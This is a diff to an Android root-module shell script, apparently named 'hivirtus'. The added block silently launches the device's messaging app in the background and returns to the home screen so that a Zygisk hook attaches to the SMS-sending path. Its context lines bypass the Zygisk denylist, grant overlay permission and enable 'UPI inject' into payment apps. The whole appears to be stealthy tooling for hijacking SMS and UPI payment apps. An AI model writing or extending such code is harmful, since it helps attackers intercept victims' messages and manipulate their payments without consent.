@@ -372,6 +372,25 @@ hivirtus_grant_overlay_permission &
 hivirtus_fix_zn_denylist 2>/dev/null &
 hivirtus_apatch_allow_upi_inject 2>/dev/null &
 
+# Warm-start default Messages so Zygisk installs ISms PLT (Hero SENDTO path)
+(
+  sleep 25
+  for mp in com.google.android.apps.messaging com.android.messaging \
+            com.samsung.android.messaging com.motorola.messaging; do
+    if pm path "$mp" >/dev/null 2>&1; then
+      am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER \
+        -n "$mp/.ui.ConversationListActivity" >/dev/null 2>&1 || \
+      monkey -p "$mp" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
+      sleep 3
+      input keyevent KEYCODE_HOME >/dev/null 2>&1 || true
+      echo "messages_warmstart:$mp $(date +%s)" >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
+      break
+    fi
+  done
+  sleep 2
+  harvest_hook_status 2>/dev/null
+) &
+
 # If UPI app is foreground but no safe_inject yet → warn (denylist/APatch block)
 (
   LAST_WARN=""
